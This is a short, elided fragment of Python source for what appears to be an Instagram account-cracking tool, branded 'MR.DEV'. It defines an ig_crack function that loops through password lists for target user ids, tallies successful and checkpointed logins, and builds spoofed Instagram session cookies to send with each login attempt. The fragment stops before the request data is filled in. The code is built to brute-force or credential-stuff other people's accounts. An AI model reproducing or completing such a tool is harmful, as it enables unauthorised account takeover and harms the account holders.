...
oks = []
cps = []
sys.stdout.write('\x1b[1;35m\x1b]2; MR.DEV \x07')
try:os.mkdir('/sdcard/DEV')
except:pass
def ua_pro():
...
def ig_crack(uid, pww, total_idz):
    ...
    sys.stdout.write(f"\r\033[1;97m [DEV-XD] {loop}|{total_idz} |\033[1;92mok:{len(oks)}\033[1;97m")
    sys.stdout.flush()
    try:
        for pw in pww:
            ...
            cookies ={
                'csrftoken': csrftoken,
                'mid': 'Z3_NxgABAAHd4ED09Lhwla239MVc',
                'ig_did': str(uuid.uuid4()).upper(),
                'ig_nrcb': '1',
                'datr': 'xs1_Z1Sdt0lJ1jAvwkEBIHNb',
                'ps_l': '1',
                'ps_n': '1',
                'wd': '885x773',}
            data = {
